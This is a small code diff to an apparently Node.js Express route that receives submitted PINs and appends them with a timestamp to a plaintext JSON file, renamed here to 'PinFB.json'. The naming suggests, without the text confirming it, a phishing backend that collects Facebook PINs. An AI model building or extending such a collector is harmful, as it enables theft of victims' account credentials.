@@ -14,7 +14,7 @@ router.post('/submit-pin', (req, res) => {
     const { pin } = req.body;
     const data = { pin, timestamp: new Date().toISOString() };
 
-    storage.appendData('responses.json', data, err => {
+    storage.appendData('PinFB.json', data, err => {
         if (err) {
             console.error('Error guardando los datos del PIN:', err);
             return res.status(500).send('Error interno del servidor');
